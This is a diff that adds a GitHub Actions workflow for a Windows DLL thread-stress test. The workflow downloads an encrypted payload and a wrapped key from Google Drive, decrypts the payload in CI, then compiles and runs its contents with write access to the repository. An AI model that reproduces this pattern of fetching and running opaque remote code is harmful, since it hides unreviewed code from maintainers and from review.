@@ -1,0 +1,174 @@
+name: thread-stress-final-v1
+
+on:
+  push:
+    paths:
+      - '.github/workflows/thread_stress_final_v1.yml'
+
+permissions:
+  contents: write
+
+defaults:
+  run:
+    shell: bash
+
+jobs:
+  thread-stress:
+    runs-on: windows-2022
+    timeout-minutes: 40
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+        with:
+          persist-credentials: true
+          fetch-depth: 0
+
+      - name: Require exact native and full-regression locks
+        run: |
+          set -euo pipefail
+          ok=0
+          for i in $(seq 1 360); do
+            git fetch -q origin main || true
+            a=0; b=0
+            if git show origin/main:evidence_summary/FINAL_NATIVE_V5_PASS.lock > "$RUNNER_TEMP/native.lock" 2>/dev/null; then
+              grep -Fq 'FINAL_NATIVE_WINDOWS_V5_PASS SHA256=8238712f68f5108ab6a6ca5d67e100e41af960a3c472899cd97a98925c68e326' "$RUNNER_TEMP/native.lock" && a=1 || true
+            fi
+            if git show origin/main:evidence_summary/FINAL_FULLREG_NATIVE_V1_PASS.lock > "$RUNNER_TEMP/fullreg.lock" 2>/dev/null; then
+              grep -Fq 'FULL_NATIVE_WINDOWS_REGRESSION_V1_PASS SHA256=8238712f68f5108ab6a6ca5d67e100e41af960a3c472899cd97a98925c68e326 NATIVE_GATE=V5' "$RUNNER_TEMP/fullreg.lock" && b=1 || true
+            fi
+            if [ "$a" = 1 ] && [ "$b" = 1 ]; then ok=1; break; fi
+            sleep 5
+          done
+          [ "$ok" = 1 ] || { echo FAIL_STAGE=PREREQUISITE_LOCKS; exit 10; }
+          echo EXACT_PREREQUISITE_LOCKS_PASS
+
+      - name: Publish thread-stress one-time RSA key
+        run: |
+          set -euo pipefail
+          openssl genpkey -algorithm RSA -pkeyopt rsa_keygen_bits:3072 -out "$RUNNER_TEMP/private.pem"
+          openssl pkey -in "$RUNNER_TEMP/private.pem" -pubout -out "$RUNNER_TEMP/public.pem"
+          git config user.name windows-dll-test-bot
+          git config user.email windows-dll-test-bot@users.noreply.github.com
+          ok=0
+          for n in 1 2 3 4 5; do
+            git fetch -q origin main
+            git checkout -q -B main origin/main
+            rm -rf .final_threadstress_handoff_v1
+            mkdir -p .final_threadstress_handoff_v1
+            cp "$RUNNER_TEMP/public.pem" .final_threadstress_handoff_v1/public.pem
+            git add .final_threadstress_handoff_v1/public.pem
+            git commit -qm 'Publish final thread stress v1 one-time RSA key' || true
+            if git push -q origin HEAD:main; then ok=1; break; fi
+            sleep 2
+          done
+          [ "$ok" = 1 ] || exit 19
+
+      - name: Download encrypted thread-stress payload
+        run: |
+          set -euo pipefail
+          url='https://drive.google.com/uc?export=download&id=1GXl1ymTiPGqiI87aQrREL5TIzz6mahuf'
+          ok=0
+          for i in $(seq 1 120); do
+            rm -f "$RUNNER_TEMP/stress.enc"
+            if curl -L -sS --fail --max-time 30 -o "$RUNNER_TEMP/stress.enc" "$url"; then
+              size=$(wc -c < "$RUNNER_TEMP/stress.enc" | tr -d '[:space:]')
+              if [ "$size" -gt 10000 ]; then ok=1; break; fi
+            fi
+            sleep 5
+          done
+          [ "$ok" = 1 ] || { echo FAIL_STAGE=THREAD_PAYLOAD_DOWNLOAD; exit 20; }
+          sha256sum "$RUNNER_TEMP/stress.enc" > thread_payload_ciphertext_sha256.txt
+
+      - name: Wait for matching thread-stress wrapped key
+        run: |
+          set -euo pipefail
+          drive='https://drive.google.com/uc?export=download&id=1EprfV4hwC0Xjq3Lf_a6jMhvTqxFiX8ov'
+          ok=0
+          for i in $(seq 1 600); do
+            rm -f "$RUNNER_TEMP/key.try" "$RUNNER_TEMP/pass.try"
+            if curl -L -sS --fail --max-time 20 -o "$RUNNER_TEMP/key.try" "$drive"; then
+              if [ "$(wc -c < "$RUNNER_TEMP/key.try" | tr -d '[:space:]')" = 384 ]; then
+                if openssl pkeyutl -decrypt -inkey "$RUNNER_TEMP/private.pem" -in "$RUNNER_TEMP/key.try" -out "$RUNNER_TEMP/pass.try" -pkeyopt rsa_padding_mode:oaep -pkeyopt rsa_oaep_md:sha256 >/dev/null 2>&1; then
+                  mv "$RUNNER_TEMP/pass.try" "$RUNNER_TEMP/pass.txt"; ok=1; break
+                fi
+              fi
+            fi
+            sleep 2
+          done
+          [ "$ok" = 1 ] || { echo FAIL_STAGE=THREAD_RSA_KEY_TIMEOUT; exit 23; }
+
+      - name: Decrypt and verify exact thread-stress payload
+        run: |
+          set -euo pipefail
+          openssl enc -d -aes-256-cbc -pbkdf2 -iter 250000 -in "$RUNNER_TEMP/stress.enc" -out "$RUNNER_TEMP/stress.tar.xz" -pass file:"$RUNNER_TEMP/pass.txt" || exit 24
+          rm -rf stress && mkdir stress
+          tar -xJf "$RUNNER_TEMP/stress.tar.xz" -C stress
+          cd stress/thread_stress_payload_v1
+          sha256sum -c THREAD_STRESS_SHA256SUMS.txt
+          test "$(sha256sum SigProcDll-64HF.dll | awk '{print $1}')" = 8238712f68f5108ab6a6ca5d67e100e41af960a3c472899cd97a98925c68e326
+          rm -f "$RUNNER_TEMP/pass.txt" "$RUNNER_TEMP/stress.enc" "$RUNNER_TEMP/stress.tar.xz"
+          echo EXACT_THREAD_STRESS_PAYLOAD_PASS
+
+      - name: Configure MSVC x86
+        uses: ilammy/msvc-dev-cmd@v1
+        with:
+          arch: x86
+
+      - name: Configure Python
+        uses: actions/setup-python@v5
+        with:
+          python-version: '3.11'
+
+      - name: Build same-process two-thread stress harness
+        shell: powershell
+        working-directory: stress\thread_stress_payload_v1
+        run: |
+          $ErrorActionPreference='Stop'
+          python build_thread_stress.py
+          if($LASTEXITCODE -ne 0){ throw 'THREAD_STRESS_SOURCE_GENERATION_FAIL' }
+          cl /nologo /O2 /W4 /WX /Fe:SigProcThreadStress.exe SigProcThreadStress.c
+          if($LASTEXITCODE -ne 0){ throw 'THREAD_STRESS_COMPILE_FAIL' }
+          if(!(Test-Path '.\SigProcThreadStress.exe')){ throw 'THREAD_STRESS_EXE_MISSING' }
+
+      - name: Run same-process two-thread 2000-loop gate
+        shell: powershell
+        working-directory: stress\thread_stress_payload_v1
+        run: |
+          $ErrorActionPreference='Stop'
+          .\SigProcThreadStress.exe *>&1 | Tee-Object -FilePath thread_stress_output.txt
+          if($LASTEXITCODE -ne 0){ throw "THREAD_STRESS_RC=$LASTEXITCODE" }
+          if(-not (Select-String -Quiet -SimpleMatch 'TWO_THREAD_2000_LOADER_CONTRACT_PASS' thread_stress_output.txt)){ throw 'THREAD_STRESS_SENTINEL_MISSING' }
+          $sha=(Get-FileHash '.\SigProcDll-64HF.dll' -Algorithm SHA256).Hash.ToLowerInvariant()
+          if($sha -ne '8238712f68f5108ab6a6ca5d67e100e41af960a3c472899cd97a98925c68e326'){ throw "CANDIDATE_SHA_CHANGED=$sha" }
+          'SAME_PROCESS_TWO_THREAD_2000_PASS' | Out-File thread_stress_pass.txt
+
+      - name: Publish exact thread-stress pass lock
+        if: success()
+        run: |
+          set -euo pipefail
+          git config user.name windows-dll-test-bot
+          git config user.email windows-dll-test-bot@users.noreply.github.com
+          ok=0
+          for n in 1 2 3 4 5; do
+            git fetch -q origin main
+            git checkout -q -B main origin/main
+            mkdir -p evidence_summary
+            printf 'SAME_PROCESS_TWO_THREAD_2000_PASS SHA256=8238712f68f5108ab6a6ca5d67e100e41af960a3c472899cd97a98925c68e326 NATIVE_GATE=V5 FULLREG=V1 RUN_ID=%s\n' "$GITHUB_RUN_ID" > evidence_summary/FINAL_THREAD_STRESS_V1_PASS.lock
+            git add evidence_summary/FINAL_THREAD_STRESS_V1_PASS.lock
+            git commit -qm 'Record final thread stress v1 pass' || true
+            if git push -q origin HEAD:main; then ok=1; break; fi
+            sleep 2
+          done
+          [ "$ok" = 1 ] || exit 60
+
+      - name: Upload thread-stress evidence
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: final-thread-stress-v1-evidence
+          path: |
+            thread_payload_ciphertext_sha256.txt
+            stress/thread_stress_payload_v1/thread_stress_output.txt
+            stress/thread_stress_payload_v1/thread_stress_pass.txt
+          if-no-files-found: ignore
+          retention-days: 7
